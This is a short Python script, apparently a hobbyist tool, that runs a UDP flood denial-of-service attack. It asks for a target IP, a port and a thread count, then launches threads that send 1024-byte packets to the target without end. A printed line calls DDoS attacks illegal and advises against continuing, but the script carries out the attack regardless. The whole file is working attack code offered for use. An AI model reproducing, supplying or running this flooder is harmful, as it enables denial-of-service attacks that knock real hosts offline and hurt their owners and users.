import socket
import threading
from colorama import init, Fore, Back, Style

init()

print(Fore.LIGHTGREEN_EX + "Note: performing ddos attacks is illegal and a form o f cybercrime, I advice you to not continue!")
print(Fore.LIGHTGREEN_EX + "------------------------------------------------------------------------------------------------------------------------")
print(Fore.WHITE + " ")

def get_user_input():
    target_ip = input("enter target ip: ")
    target_port = int(input("enter target port: "))
    num_threads = int(input("enter number of threads: "))
    return target_ip, target_port, num_threads

def attack(target_ip, target_port):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = b'\x00' * 1024  
    while True:
        client.sendto(bytes, (target_ip, target_port))

def main():
    target_ip, target_port, num_threads = get_user_input()
    print(f"starting attack on {target_ip}:{target_port} with {num_threads} threads")

    for i in range(num_threads):
        thread = threading.Thread(target=attack, args=(target_ip, target_port))
        thread.start()

if __name__ == "__main__":
    main()
